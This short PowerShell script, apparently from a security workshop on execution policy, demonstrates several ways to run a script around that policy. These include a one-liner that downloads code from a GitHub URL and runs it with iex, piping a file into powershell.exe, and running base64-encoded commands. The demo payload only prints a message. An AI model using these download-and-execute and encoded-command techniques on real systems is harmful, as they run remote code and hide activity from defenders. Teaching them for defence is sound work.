# Download a script from the internet
$uri = 'https://raw.githubusercontent.com/PSBlackOps/GrrCON-Workshop/master/Demos/ExecutionPolicy/RunMeIfYouCan.ps1'
powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('$uri')"

# Read the content of a file, then pipe it to PowerShell.exe's STDIN
Get-Content .\RunMeIfYouCan.ps1 | powershell.exe -nop -

# Run PowerShell.exe from CMD
powershell.exe -nop -file .\RunMeIfYouCan.ps1

# Use the encodedcommand switch
$command = "Write-Host 'There is no right and wrong. There's only fun and boring." 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand = [Convert]::ToBase64String($bytes) 
powershell.exe -EncodedCommand $encodedCommand